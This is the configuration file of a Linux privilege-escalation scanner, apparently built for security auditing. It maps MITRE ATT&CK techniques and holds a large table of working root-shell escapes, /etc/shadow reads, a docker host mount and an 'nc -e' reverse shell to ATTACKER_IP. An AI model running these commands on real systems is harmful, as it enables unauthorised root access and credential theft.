#!/usr/bin/env python3
# ContextPrivesc - Configuration Constants

import os
from pathlib import Path

BASE_DIR = Path(__file__).parent.parent
RESULTS_DIR = BASE_DIR / "results"
LOG_DIR = Path("/var/log/contextprivesc")
TEMP_DIR = Path("/tmp/contextprivesc")

for dir_path in [RESULTS_DIR, LOG_DIR, TEMP_DIR]:
    dir_path.mkdir(parents=True, exist_ok=True)

SCAN_MODES = {
    "quick": {"name": "Quick Scan", "timeout": 60, "desc": "Essential checks only (30-60 sec)"},
    "normal": {"name": "Normal Scan", "timeout": 300, "desc": "Comprehensive scan (2-5 min)"},
    "full": {"name": "Full Scan", "timeout": 600, "desc": "Deep scan with all checks (5-10 min)"}
}

MITRE_TECHNIQUES = {
    "T1082": {"name": "System Information Discovery", "tactic": "Discovery"},
    "T1548.001": {"name": "Setuid and Setgid", "tactic": "Privilege Escalation"},
    "T1548.003": {"name": "Sudo and Sudo Caching", "tactic": "Privilege Escalation"},
    "T1053.003": {"name": "Cron", "tactic": "Execution"},
    "T1068": {"name": "Exploitation for Privilege Escalation", "tactic": "Privilege Escalation"},
    "T1611": {"name": "Escape to Host", "tactic": "Privilege Escalation"},
    "T1003.008": {"name": "OS Credential Dumping", "tactic": "Credential Access"},
    "T1552.001": {"name": "Credentials in Files", "tactic": "Credential Access"},
    "T1552.004": {"name": "Private Keys", "tactic": "Credential Access"},
    "T1078": {"name": "Valid Accounts", "tactic": "Initial Access"},
    "T1083": {"name": "File Discovery", "tactic": "Discovery"},
    "T1057": {"name": "Process Discovery", "tactic": "Discovery"},
    "T1005": {"name": "Data from Local System", "tactic": "Collection"},
    "T1021.004": {"name": "SSH", "tactic": "Lateral Movement"},
    "T1222": {"name": "File Permissions Modification", "tactic": "Defense Evasion"},
    "T1562": {"name": "Impair Defenses", "tactic": "Defense Evasion"},
    "T1036": {"name": "Masquerading", "tactic": "Defense Evasion"},
    "T1574.007": {"name": "Path Interception", "tactic": "Privilege Escalation"},
}

GTFOBINS = {
    "bash": "bash -p", "sh": "sh -p", "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "perl": "perl -e 'use POSIX; setuid(0); exec \"/bin/bash\";'",
    "ruby": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'", "find": "find . -exec /bin/bash -p \\; -quit",
    "vim": "vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")'", "vi": "vi -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")'",
    "nano": "nano (CTRL+R, CTRL+X, reset; sh 1>&0 2>&0)", "less": "less /etc/passwd (then: !/bin/bash -p)",
    "more": "more /etc/passwd (then: !/bin/bash -p)", "awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
    "sed": "sed -n '1e exec sh 1>&0' /etc/hosts", "cp": "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && /tmp/bash -p",
    "chmod": "chmod 4777 /bin/bash && /bin/bash -p", "nmap": "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && nmap --script=/tmp/x.nse",
    "php": "php -r 'posix_setuid(0); system(\"/bin/bash -p\");'", "node": "node -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/bash\",[\"-p\"])'",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt bash", "git": "git -p help config (then: !/bin/bash -p)",
    "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "make": "make -s --eval='x:\\n\\t-\"/bin/bash -p\"'", "gcc": "gcc -wrapper /bin/bash,-p .",
    "strace": "strace -o /dev/null /bin/bash -p", "gdb": "gdb -q --nx -ex 'python import os;os.setuid(0)' -ex 'run /bin/bash -p'",
    "mysql": "mysql -e '\\\\! /bin/bash'", "psql": "psql -c '\\\\! /bin/bash'", "lua": "lua -e 'os.execute(\"/bin/bash -p\")'",
    "expect": "expect -c 'spawn /bin/bash -p; interact'", "base64": "base64 /etc/shadow | base64 -d",
    "cat": "cat /etc/shadow", "curl": "curl file:///etc/shadow", "wget": "wget -qO- file:///etc/shadow",
    "nc": "nc -e /bin/bash ATTACKER_IP 4444", "socat": "socat stdin exec:/bin/bash,pty,stderr,setsid",
    "screen": "screen", "tmux": "tmux", "busybox": "busybox sh",
}

COLORS = {
    "CRITICAL": "\033[1;31m", "WARNING": "\033[1;33m", "INFO": "\033[0;36m",
    "SECURE": "\033[1;32m", "MITRE": "\033[0;35m", "EXPLOIT": "\033[38;5;208m", "RESET": "\033[0m"
}

DEEPSEEK_API_BASE = "https://api.deepseek.com/v1"
DEFAULT_AI_MODEL = "deepseek-chat"
